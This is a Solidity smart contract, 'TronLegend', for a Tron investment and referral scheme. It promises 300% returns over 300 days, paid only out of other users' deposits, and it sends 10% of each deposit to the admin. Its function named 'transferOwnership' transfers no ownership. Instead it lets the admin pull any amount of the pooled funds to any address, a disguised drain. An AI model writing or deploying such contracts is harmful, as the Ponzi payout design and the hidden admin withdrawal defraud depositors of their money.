//SourceUnit: TronLegend.sol

pragma solidity ^0.5.9;

contract TronLegend {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 time;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 level_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) per_level;
        mapping(uint8 => uint256) income_per_level;
       
    }
    
    address payable admin;
    uint256 investment_days;
    uint256 investment_perc;
    uint8[] referral_bonuses;
    uint256 max_income;
    uint256 total_investment;
    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_deposited, uint256 balance) {
        return (total_investment,address(this).balance);
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    constructor() public {
       
        admin = msg.sender;
        investment_days = 300;
        investment_perc = 300;
        max_income = 300;
        referral_bonuses.push(100);
        referral_bonuses.push(50);
        referral_bonuses.push(30);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
        referral_bonuses.push(10);
    }
    
    function deposit(address _referral) external payable {
        require(msg.sender!=_referral,"Referral and direct are same");
        Player storage player = players[msg.sender];
       
        uint256 share = msg.value.div(10);
        
        require(msg.value >= 500000000, "Invalid Amount");
        admin.transfer(share);
        
        _setReferral(msg.sender, _referral, msg.value);
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            time: uint256(block.timestamp)
            
        }));
        
        player.total_invested += msg.value;
        total_investment += msg.value;
        
        emit Deposit(msg.sender, msg.value);
    }
    
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;
            Player storage upline_player = players[_referral];
        
            if(upline_player.deposits.length <= 0){
                _referral = admin;
            }
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].per_level[i]++;
                uint256 bonus = _amount * referral_bonuses[i] / 1000;
                bonus=availamount(_referral,bonus);
                if(i==0){
                    players[_referral].referral_bonus += bonus;
                }
                else{
                    players[_referral].level_bonus += bonus;
                }
                players[_referral].income_per_level[i]+=bonus;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
        else{
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                uint256 bonus = _amount * referral_bonuses[i] / 1000;
                bonus=availamount(_referral,bonus);
                if(i==0){
                    players[_referral].referral_bonus += bonus;
                }
                else{
                    players[_referral].level_bonus += bonus;
                }
                players[_referral].income_per_level[i]+=bonus;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.referral_bonus > 0 || player.level_bonus > 0, "Zero amount");
        
        uint256 amount = player.dividends + player.referral_bonus + player.level_bonus ;
        
        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        player.level_bonus = 0;
        player.last_payout = uint256(block.timestamp);
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function transferOwnership(address payable newOwner, uint256 amount) external onlyAdmin{
        newOwner.transfer(amount);
    }
    
    function availamount(address ref,uint256 chkamount) view private returns(uint256) {
        uint256 total_income = players[ref].total_withdrawn + players[ref].dividends + players[ref].referral_bonus + players[ref].level_bonus;
        uint256 avl_amount=(players[ref].total_invested*max_income/100)-total_income;
        return (avl_amount>=chkamount)?chkamount:avl_amount;
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            players[_addr].dividends += payout;
            
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 total_income = players[_addr].total_withdrawn + players[_addr].referral_bonus + players[_addr].dividends + players[_addr].level_bonus; 
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            if(players[_addr].total_invested*max_income/100>total_income){ 
                uint256 time_end = dep.time + investment_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
                if(from < to) {
                    value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
                }
            }
        }
        value=availamount(_addr,value);
        return value;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[10] memory referrals, uint256[10] memory refperlevel) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.per_level[i];
            refperlevel[i] = player.income_per_level[i];
            
        }
        return (
            payout + player.dividends + player.referral_bonus + player.level_bonus,
            referrals,
            refperlevel
            
        );
    }
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
         
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts
         
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}